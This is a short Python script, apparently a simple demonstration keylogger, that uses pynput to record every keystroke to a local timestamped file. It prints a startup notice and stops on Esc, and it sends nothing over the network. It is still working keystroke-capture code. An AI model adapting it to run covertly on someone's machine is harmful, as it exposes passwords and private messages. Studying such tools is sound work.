from datetime import datetime
from pynput.keyboard import Key, Listener

# Generate a timestamped filename
now = datetime.now()
filename = now.strftime("keyStroke_%Y-%m-%d_%H-%M-%S.txt")

# List to store pressed keys
keys = []

# Function to handle key press events
def on_press(key):
    try:
        keys.append(key.char)  # Regular characters
    except AttributeError:
        keys.append(str(key))  # Special keys
    # Write to file after every key press
    with open(filename, "a") as file:
        file.write(f"{keys[-1]}\n")

# Flag to check if 'Esc' was pressed
esc_pressed = False

# Function to handle key release events
def on_release(key):
    global esc_pressed
    if key == Key.esc:
        esc_pressed = True
        return False  # Stop listener

# Display a startup message
print(f"Keylogger started. Logging keystrokes to {filename}. Press 'Esc' to stop.")

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Display exit message only if 'Esc' was not pressed
if not esc_pressed:
    print(f"Keylogger stopped. All keystrokes saved to {filename}.")
